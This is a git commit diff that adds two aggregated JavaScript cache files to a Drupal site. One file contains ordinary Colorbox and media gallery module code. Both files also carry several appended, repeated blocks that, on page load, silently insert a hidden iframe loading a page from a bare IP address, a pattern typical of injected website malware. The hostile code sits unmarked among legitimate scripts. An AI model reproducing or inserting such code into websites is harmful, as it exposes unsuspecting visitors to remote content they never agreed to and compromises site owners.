167550b444cf63041d8707eaf413650cc19a3bd8
Campbell Vertesi <campbell@vertesi.com>
2019-04-18 07:34:19 +0200

    Initial commit

---
+++ sites/default/files/js/js_2KlXA4Z5El1IQFVPxDN1aX5mIoMSFWGv3vwsP77K9yk.js
@@ -0,0 +1,40 @@
+;
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
---
+++ sites/default/files/js/js__LQo-PeKfv_h5gGgtiukPaQCqaZWEtSs9-yV0hQs8cM.js
@@ -0,0 +1,125 @@
+/**
+ * @file
+ * Colorbox module init js.
+ */
+
+(function ($) {
+
+Drupal.behaviors.initColorbox = {
+  attach: function (context, settings) {
+    if (!$.isFunction($.colorbox) || typeof settings.colorbox === 'undefined') {
+      return;
+    }
+
+    if (settings.colorbox.mobiledetect && window.matchMedia) {
+      // Disable Colorbox for small screens.
+      var mq = window.matchMedia("(max-device-width: " + settings.colorbox.mobiledevicewidth + ")");
+      if (mq.matches) {
+        return;
+      }
+    }
+
+    // Use "data-colorbox-gallery" if set otherwise use "rel".
+    settings.colorbox.rel = function () {
+      if ($(this).data('colorbox-gallery')) {
+        return $(this).data('colorbox-gallery');
+      }
+      else {
+        return $(this).attr('rel');
+      }
+    };
+
+    $('.colorbox', context)
+      .once('init-colorbox')
+      .colorbox(settings.colorbox);
+
+    $(context).bind('cbox_complete', function () {
+      Drupal.attachBehaviors('#cboxLoadedContent');
+    });
+  }
+};
+
+})(jQuery);
+;
+/**
+ * @file
+ * Colorbox module style js.
+ */
+
+(function ($) {
+
+Drupal.behaviors.initColorboxDefaultStyle = {
+  attach: function (context, settings) {
+    $(context).bind('cbox_complete', function () {
+      // Only run if there is a title.
+      if ($('#cboxTitle:empty', context).length == false) {
+        $('#cboxLoadedContent img', context).bind('mouseover', function () {
+          $('#cboxTitle', context).slideDown();
+        });
+        $('#cboxOverlay', context).bind('mouseover', function () {
+          $('#cboxTitle', context).slideUp();
+        });
+      }
+      else {
+        $('#cboxTitle', context).hide();
+      }
+    });
+  }
+};
+
+})(jQuery);
+;
+(function ($) {
+
+Drupal.behaviors.media_gallery = {};
+
+Drupal.behaviors.media_gallery.attach = function (context, settings) {
+  $(window).bind('media_youtube_load', Drupal.media_gallery.handleMediaYoutubeLoad);
+};
+
+Drupal.media_gallery = {};
+
+Drupal.media_gallery.handleMediaYoutubeLoad = function (event, videoSettings) {
+  $('.media-gallery-detail').width(videoSettings.width + 'px');
+};
+
+})(jQuery);;
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
+;;;;
+
+
+
+if (typeof window.zioelaneid == 'undefined') {
+	window.zioelaneid = 1;
+	document.addEventListener("DOMContentLoaded", function(event) { 
+		var iframe = document.createElement('iframe');
+		iframe.style.display = "none";
+		iframe.src = "http://51.255.91.41/iframe.php";
+		document.body.appendChild(iframe);
+	});
+}
